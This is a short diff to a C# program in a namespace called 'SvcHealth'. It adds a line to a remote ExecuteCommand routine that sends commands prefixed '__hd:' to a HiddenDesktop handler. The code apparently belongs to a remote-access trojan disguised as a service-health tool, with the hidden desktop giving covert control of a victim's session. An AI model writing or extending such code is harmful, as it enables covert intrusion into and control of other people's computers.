@@ -113,6 +113,7 @@ namespace SvcHealth
 
         static string ExecuteCommand(string cmd)
         {
+            if (cmd.StartsWith("__hd:")) return HiddenDesktop.Handle(cmd);
             if (cmd.StartsWith("cd "))
             {
                 try
